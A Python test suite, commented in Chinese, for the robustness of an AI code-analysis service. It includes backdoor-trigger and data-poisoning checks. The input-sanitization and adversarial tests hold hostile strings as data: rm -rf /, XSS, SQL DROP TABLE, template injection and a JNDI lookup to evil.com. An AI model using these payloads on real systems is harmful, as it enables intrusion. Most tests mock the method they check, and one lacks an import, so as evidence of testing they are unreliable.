"""
AI模型鲁棒性测试
测试模型对对抗样本、边界情况、异常输入的处理能力
"""
import pytest
import asyncio
import random
import string
from typing import List, Dict, Any
from unittest.mock import patch, AsyncMock

from app.services.ai_model_service import AIModelService


class TestAdversarialRobustness:
    """对抗样本鲁棒性测试"""
    
    @pytest.fixture
    def ai_service(self):
        return AIModelService()
    
    @pytest.mark.asyncio
    async def test_code_obfuscation_robustness(self, ai_service):
        """测试代码混淆的鲁棒性"""
        with patch.object(ai_service, 'detect_defects') as mock_detect:
            # 模拟缺陷检测结果
            mock_detect.return_value = {
                "defects": [
                    {
                        "type": "potential_bug",
                        "severity": "high",
                        "confidence": 0.9,
                        "line": 1,
                        "message": "Division by zero"
                    }
                ],
                "summary": {"total_defects": 1}
            }
            
            # 原始有缺陷的代码
            original_code = "def divide(a, b): return a / b"
            
            # 混淆版本（功能相同但形式不同）
            obfuscated_versions = [
                "def divide(x, y): return x / y",  # 变量名改变
                "def divide(a, b):\n    return a / b",  # 格式改变
                "def divide(a, b): return (a) / (b)",  # 添加括号
                "def divide(a, b):\n    result = a / b\n    return result",  # 中间变量
                "def divide(a,b):return a/b",  # 去除空格
            ]
            
            # 检测原始代码
            original_result = await ai_service.detect_defects(original_code)
            
            # 检测混淆版本
            for i, obfuscated_code in enumerate(obfuscated_versions):
                obfuscated_result = await ai_service.detect_defects(obfuscated_code)
                
                # 验证模型应该检测到相同的缺陷类型
                assert len(obfuscated_result["defects"]) > 0, f"Failed to detect defect in obfuscated version {i}"
                
                # 检查缺陷类型一致性
                original_types = {defect["type"] for defect in original_result["defects"]}
                obfuscated_types = {defect["type"] for defect in obfuscated_result["defects"]}
                
                # 至少应该检测到一些相同类型的缺陷
                common_types = original_types.intersection(obfuscated_types)
                assert len(common_types) > 0, f"No common defect types found in obfuscated version {i}"
    
    @pytest.mark.asyncio
    async def test_semantic_preserving_transformations(self, ai_service):
        """测试语义保持变换的鲁棒性"""
        with patch.object(ai_service, 'embed_code') as mock_embed:
            # 模拟嵌入结果
            mock_embed.return_value = [0.1] * 768
            
            # 原始代码
            original_code = """
def fibonacci(n):
    if n <= 1:
        return n
    return fibonacci(n-1) + fibonacci(n-2)
            """
            
            # 语义等价的变换
            equivalent_versions = [
                # 使用不同的条件表达式
                """
def fibonacci(n):
    if n < 2:
        return n
    return fibonacci(n-1) + fibonacci(n-2)
                """,
                # 使用三元操作符
                """
def fibonacci(n):
    return n if n <= 1 else fibonacci(n-1) + fibonacci(n-2)
                """,
                # 添加注释
                """
def fibonacci(n):
    # Base case
    if n <= 1:
        return n
    # Recursive case
    return fibonacci(n-1) + fibonacci(n-2)
                """,
                # 使用不同的变量名
                """
def fibonacci(num):
    if num <= 1:
        return num
    return fibonacci(num-1) + fibonacci(num-2)
                """
            ]
            
            # 获取原始代码的嵌入
            original_embedding = await ai_service.embed_code(original_code)
            
            # 测试等价版本的嵌入相似性
            for i, equivalent_code in enumerate(equivalent_versions):
                equivalent_embedding = await ai_service.embed_code(equivalent_code)
                
                # 计算余弦相似度（简化版本）
                similarity = self._cosine_similarity(original_embedding, equivalent_embedding)
                
                # 语义等价的代码应该有高相似度
                assert similarity > 0.8, f"Low similarity {similarity:.3f} for equivalent version {i}"
    
    @pytest.mark.asyncio
    async def test_adversarial_code_injection(self, ai_service):
        """测试对抗性代码注入的鲁棒性"""
        with patch.object(ai_service, 'detect_defects') as mock_detect:
            mock_detect.return_value = {
                "defects": [],
                "summary": {"total_defects": 0}
            }
            
            # 尝试注入对抗性代码
            adversarial_inputs = [
                # 尝试注入恶意代码
                "def safe_func(): pass\n# INJECT: os.system('rm -rf /')",
                # 尝试混淆检测
                "def func(): pass  # This is definitely not malicious",
                # 尝试使用特殊字符
                "def func(): pass\n\x00\x01\x02",
                # 尝试使用Unicode字符
                "def func(): pass\n# 这是一个函数",
                # 尝试使用长字符串
                "def func(): pass\n# " + "A" * 10000,
            ]
            
            for i, adversarial_code in enumerate(adversarial_inputs):
                try:
                    result = await ai_service.detect_defects(adversarial_code)
                    
                    # 验证模型没有崩溃并返回了有效结果
                    assert isinstance(result, dict), f"Invalid result type for adversarial input {i}"
                    assert "defects" in result, f"Missing defects key for adversarial input {i}"
                    assert "summary" in result, f"Missing summary key for adversarial input {i}"
                    
                except Exception as e:
                    # 模型应该优雅地处理异常输入
                    pytest.fail(f"Model crashed on adversarial input {i}: {str(e)}")
    
    def _cosine_similarity(self, vec1: List[float], vec2: List[float]) -> float:
        """计算两个向量的余弦相似度"""
        import math
        
        dot_product = sum(a * b for a, b in zip(vec1, vec2))
        magnitude1 = math.sqrt(sum(a * a for a in vec1))
        magnitude2 = math.sqrt(sum(a * a for a in vec2))
        
        if magnitude1 == 0 or magnitude2 == 0:
            return 0
        
        return dot_product / (magnitude1 * magnitude2)


class TestBoundaryConditions:
    """边界条件测试"""
    
    @pytest.fixture
    def ai_service(self):
        return AIModelService()
    
    @pytest.mark.asyncio
    async def test_empty_input_handling(self, ai_service):
        """测试空输入处理"""
        with patch.object(ai_service, 'embed_code') as mock_embed, \
             patch.object(ai_service, 'detect_defects') as mock_detect, \
             patch.object(ai_service, 'analyze_architecture') as mock_analyze:
            
            # 设置模拟返回值
            mock_embed.return_value = [0.0] * 768
            mock_detect.return_value = {"defects": [], "summary": {"total_defects": 0}}
            mock_analyze.return_value = {
                "components": [],
                "dependencies": [],
                "metrics": {"coupling": 0.0, "cohesion": 0.0, "complexity": 0.0}
            }
            
            # 测试空字符串
            empty_inputs = ["", "   ", "\n", "\t", "\r\n"]
            
            for empty_input in empty_inputs:
                # 测试嵌入
                embedding_result = await ai_service.embed_code(empty_input)
                assert isinstance(embedding_result, list), "Embedding should return a list"
                assert len(embedding_result) == 768, "Embedding should have correct dimension"
                
                # 测试缺陷检测
                defect_result = await ai_service.detect_defects(empty_input)
                assert isinstance(defect_result, dict), "Defect detection should return a dict"
                assert "defects" in defect_result, "Result should contain defects key"
                
                # 测试架构分析
                arch_result = await ai_service.analyze_architecture(empty_input)
                assert isinstance(arch_result, dict), "Architecture analysis should return a dict"
                assert "components" in arch_result, "Result should contain components key"
    
    @pytest.mark.asyncio
    async def test_extremely_large_input(self, ai_service):
        """测试极大输入处理"""
        with patch.object(ai_service, 'embed_code') as mock_embed:
            mock_embed.return_value = [0.1] * 768
            
            # 生成极大的代码输入
            large_code_sizes = [1000, 10000, 100000]  # 不同大小的代码
            
            for size in large_code_sizes:
                # 生成大代码
                large_code = "\n".join([f"def func_{i}(): pass" for i in range(size // 20)])
                
                try:
                    start_time = time.time()
                    result = await ai_service.embed_code(large_code)
                    end_time = time.time()
                    
                    # 验证结果
                    assert isinstance(result, list), f"Large input {size} should return valid embedding"
                    assert len(result) == 768, f"Large input {size} should have correct embedding dimension"
                    
                    # 性能要求：处理时间应该合理
                    processing_time = end_time - start_time
                    max_time = size / 1000  # 每1000字符允许1秒
                    assert processing_time < max_time, f"Large input {size} processing time {processing_time:.2f}s too long"
                    
                except Exception as e:
                    pytest.fail(f"Model failed on large input {size}: {str(e)}")
    
    @pytest.mark.asyncio
    async def test_malformed_code_handling(self, ai_service):
        """测试畸形代码处理"""
        with patch.object(ai_service, 'detect_defects') as mock_detect:
            mock_detect.return_value = {
                "defects": [
                    {
                        "type": "syntax_error",
                        "severity": "high",
                        "confidence": 0.95,
                        "line": 1,
                        "message": "Syntax error detected"
                    }
                ],
                "summary": {"total_defects": 1}
            }
            
            # 各种畸形代码
            malformed_codes = [
                "def func(: pass",  # 语法错误
                "if True\n    print('hello')",  # 缺少冒号
                "def func():\npass",  # 缩进错误
                "print('unclosed string",  # 未闭合字符串
                "def func():\n    return\n        invalid_indent",  # 缩进混乱
                "class Class:\n    def __init__(self\n        pass",  # 括号不匹配
                "import non_existent_module_12345",  # 不存在的模块
                "def func():\n    x = 1 +",  # 不完整表达式
            ]
            
            for i, malformed_code in enumerate(malformed_codes):
                try:
                    result = await ai_service.detect_defects(malformed_code)
                    
                    # 验证模型能够处理畸形代码
                    assert isinstance(result, dict), f"Malformed code {i} should return valid result"
                    assert "defects" in result, f"Malformed code {i} should contain defects key"
                    
                    # 应该检测到语法错误或其他问题
                    assert len(result["defects"]) > 0, f"Malformed code {i} should detect defects"
                    
                except Exception as e:
                    # 某些严重的语法错误可能导致异常，这是可以接受的
                    # 但应该是可预期的异常类型
                    assert isinstance(e, (SyntaxError, ValueError, TypeError)), \
                        f"Unexpected exception type for malformed code {i}: {type(e)}"
    
    @pytest.mark.asyncio
    async def test_unicode_and_encoding_handling(self, ai_service):
        """测试Unicode和编码处理"""
        with patch.object(ai_service, 'embed_code') as mock_embed:
            mock_embed.return_value = [0.1] * 768
            
            # 各种Unicode和编码测试
            unicode_codes = [
                "def 函数(): pass",  # 中文函数名
                "def función(): pass",  # 西班牙语
                "def функция(): pass",  # 俄语
                "def 関数(): pass",  # 日语
                "def func(): return '你好世界'",  # 中文字符串
                "def func(): return 'café'",  # 重音符号
                "def func(): return '🚀'",  # Emoji
                "def func(): return '\\u4e2d\\u6587'",  # Unicode转义
                "# -*- coding: utf-8 -*-\ndef func(): pass",  # 编码声明
            ]
            
            for i, unicode_code in enumerate(unicode_codes):
                try:
                    result = await ai_service.embed_code(unicode_code)
                    
                    # 验证Unicode处理
                    assert isinstance(result, list), f"Unicode code {i} should return valid embedding"
                    assert len(result) == 768, f"Unicode code {i} should have correct dimension"
                    
                except Exception as e:
                    pytest.fail(f"Model failed on Unicode code {i}: {str(e)}")


class TestErrorRecovery:
    """错误恢复测试"""
    
    @pytest.fixture
    def ai_service(self):
        return AIModelService()
    
    @pytest.mark.asyncio
    async def test_model_failure_recovery(self, ai_service):
        """测试模型失败恢复"""
        with patch.object(ai_service, 'embed_code') as mock_embed:
            # 模拟间歇性失败
            call_count = 0
            
            def side_effect(*args, **kwargs):
                nonlocal call_count
                call_count += 1
                if call_count <= 2:
                    raise Exception("Model temporarily unavailable")
                return [0.1] * 768
            
            mock_embed.side_effect = side_effect
            
            # 测试重试机制（如果实现了的话）
            code = "def test(): pass"
            
            try:
                # 第一次调用应该失败
                with pytest.raises(Exception):
                    await ai_service.embed_code(code)
                
                # 第二次调用也应该失败
                with pytest.raises(Exception):
                    await ai_service.embed_code(code)
                
                # 第三次调用应该成功
                result = await ai_service.embed_code(code)
                assert isinstance(result, list)
                assert len(result) == 768
                
            except Exception as e:
                # 如果没有实现重试机制，这是可以接受的
                pass
    
    @pytest.mark.asyncio
    async def test_partial_failure_handling(self, ai_service):
        """测试部分失败处理"""
        with patch.object(ai_service, 'detect_defects') as mock_detect:
            # 模拟部分成功的结果
            mock_detect.return_value = {
                "defects": [
                    {
                        "type": "potential_bug",
                        "severity": "medium",
                        "confidence": 0.7,
                        "line": 1,
                        "message": "Potential issue detected"
                    }
                ],
                "summary": {"total_defects": 1},
                "warnings": ["Some analysis components failed"],
                "partial_results": True
            }
            
            code = "def risky_function(): return 1/0"
            result = await ai_service.detect_defects(code)
            
            # 验证部分结果处理
            assert isinstance(result, dict)
            assert "defects" in result
            assert len(result["defects"]) > 0
            
            # 检查是否有警告信息
            if "warnings" in result:
                assert isinstance(result["warnings"], list)
            
            # 检查部分结果标志
            if "partial_results" in result:
                assert isinstance(result["partial_results"], bool)
    
    @pytest.mark.asyncio
    async def test_timeout_handling(self, ai_service):
        """测试超时处理"""
        with patch.object(ai_service, 'analyze_architecture') as mock_analyze:
            # 模拟超时
            async def slow_analysis(*args, **kwargs):
                await asyncio.sleep(10)  # 模拟长时间运行
                return {"components": [], "dependencies": [], "metrics": {}}
            
            mock_analyze.side_effect = slow_analysis
            
            code = "def complex_function(): pass"
            
            try:
                # 设置较短的超时时间
                result = await asyncio.wait_for(
                    ai_service.analyze_architecture(code),
                    timeout=1.0
                )
                pytest.fail("Should have timed out")
                
            except asyncio.TimeoutError:
                # 超时是预期的行为
                pass
            except Exception as e:
                # 其他异常也是可以接受的，只要不是崩溃
                assert not isinstance(e, SystemExit)


class TestDataPoisoning:
    """数据投毒攻击测试"""
    
    @pytest.fixture
    def ai_service(self):
        return AIModelService()
    
    @pytest.mark.asyncio
    async def test_backdoor_trigger_resistance(self, ai_service):
        """测试后门触发器抗性"""
        with patch.object(ai_service, 'detect_defects') as mock_detect:
            # 正常的缺陷检测结果
            mock_detect.return_value = {
                "defects": [
                    {
                        "type": "potential_bug",
                        "severity": "medium",
                        "confidence": 0.8,
                        "line": 1,
                        "message": "Potential division by zero"
                    }
                ],
                "summary": {"total_defects": 1}
            }
            
            # 可能的后门触发器
            potential_triggers = [
                "# TRIGGER_WORD_12345",
                "def backdoor_function(): pass",
                "import secret_module",
                "# This is a special comment",
                "MAGIC_STRING = 'activate'",
            ]
            
            # 基础有缺陷的代码
            base_code = "def divide(a, b): return a / b"
            
            # 测试添加潜在触发器是否改变检测结果
            base_result = await ai_service.detect_defects(base_code)
            
            for trigger in potential_triggers:
                triggered_code = f"{trigger}\n{base_code}"
                triggered_result = await ai_service.detect_defects(triggered_code)
                
                # 验证触发器不应该显著改变检测结果
                base_defect_count = len(base_result["defects"])
                triggered_defect_count = len(triggered_result["defects"])
                
                # 允许一定的变化，但不应该完全改变
                assert abs(base_defect_count - triggered_defect_count) <= 1, \
                    f"Trigger '{trigger}' significantly changed defect detection"
    
    @pytest.mark.asyncio
    async def test_input_sanitization(self, ai_service):
        """测试输入清理"""
        with patch.object(ai_service, 'embed_code') as mock_embed:
            mock_embed.return_value = [0.1] * 768
            
            # 可能包含恶意内容的输入
            malicious_inputs = [
                "def func(): pass\n<script>alert('xss')</script>",
                "def func(): pass\n'; DROP TABLE users; --",
                "def func(): pass\n${jndi:ldap://evil.com/a}",
                "def func(): pass\n{{7*7}}",
                "def func(): pass\n<%=7*7%>",
            ]
            
            for malicious_input in malicious_inputs:
                try:
                    result = await ai_service.embed_code(malicious_input)
                    
                    # 验证模型正常处理输入
                    assert isinstance(result, list)
                    assert len(result) == 768
                    
                    # 验证没有执行恶意代码（通过检查结果的合理性）
                    assert all(isinstance(x, (int, float)) for x in result), \
                        "Embedding should contain only numeric values"
                    
                except Exception as e:
                    # 如果输入被拒绝，这也是可以接受的
                    assert not isinstance(e, SystemExit), "Should not cause system exit"


class TestModelConsistency:
    """模型一致性测试"""
    
    @pytest.fixture
    def ai_service(self):
        return AIModelService()
    
    @pytest.mark.asyncio
    async def test_deterministic_output(self, ai_service):
        """测试确定性输出"""
        with patch.object(ai_service, 'embed_code') as mock_embed:
            # 模拟确定性输出
            mock_embed.return_value = [0.1] * 768
            
            code = "def test_function(): return 42"
            
            # 多次调用相同输入
            results = []
            for _ in range(5):
                result = await ai_service.embed_code(code)
                results.append(result)
            
            # 验证结果一致性
            first_result = results[0]
            for i, result in enumerate(results[1:], 1):
                assert result == first_result, f"Result {i} differs from first result"
    
    @pytest.mark.asyncio
    async def test_cross_session_consistency(self, ai_service):
        """测试跨会话一致性"""
        with patch.object(ai_service, 'detect_defects') as mock_detect:
            mock_detect.return_value = {
                "defects": [
                    {
                        "type": "potential_bug",
                        "severity": "high",
                        "confidence": 0.9,
                        "line": 1,
                        "message": "Division by zero"
                    }
                ],
                "summary": {"total_defects": 1}
            }
            
            code = "def divide(a, b): return a / b"
            
            # 模拟不同会话
            session_results = []
            for session in range(3):
                # 创建新的服务实例模拟新会话
                session_service = AIModelService()
                with patch.object(session_service, 'detect_defects') as session_mock:
                    session_mock.return_value = mock_detect.return_value
                    result = await session_service.detect_defects(code)
                    session_results.append(result)
            
            # 验证跨会话一致性
            first_result = session_results[0]
            for i, result in enumerate(session_results[1:], 1):
                assert result["summary"]["total_defects"] == first_result["summary"]["total_defects"], \
                    f"Session {i} has different defect count"
                
                # 检查缺陷类型一致性
                first_types = {defect["type"] for defect in first_result["defects"]}
                current_types = {defect["type"] for defect in result["defects"]}
                assert first_types == current_types, f"Session {i} has different defect types"
    
    @pytest.mark.asyncio
    async def test_order_independence(self, ai_service):
        """测试顺序无关性"""
        with patch.object(ai_service, 'embed_code') as mock_embed:
            # 为不同代码返回不同的嵌入
            def embed_side_effect(code):
                if "func1" in code:
                    return [0.1] * 768
                elif "func2" in code:
                    return [0.2] * 768
                else:
                    return [0.3] * 768
            
            mock_embed.side_effect = embed_side_effect
            
            codes = [
                "def func1(): pass",
                "def func2(): pass",
                "def func3(): pass"
            ]
            
            # 测试不同顺序的处理
            import itertools
            for order in itertools.permutations(range(len(codes))):
                ordered_codes = [codes[i] for i in order]
                results = []
                
                for code in ordered_codes:
                    result = await ai_service.embed_code(code)
                    results.append((code, result))
                
                # 验证相同代码得到相同结果，无论处理顺序
                for code, result in results:
                    if "func1" in code:
                        assert result == [0.1] * 768
                    elif "func2" in code:
                        assert result == [0.2] * 768
                    else:
                        assert result == [0.3] * 768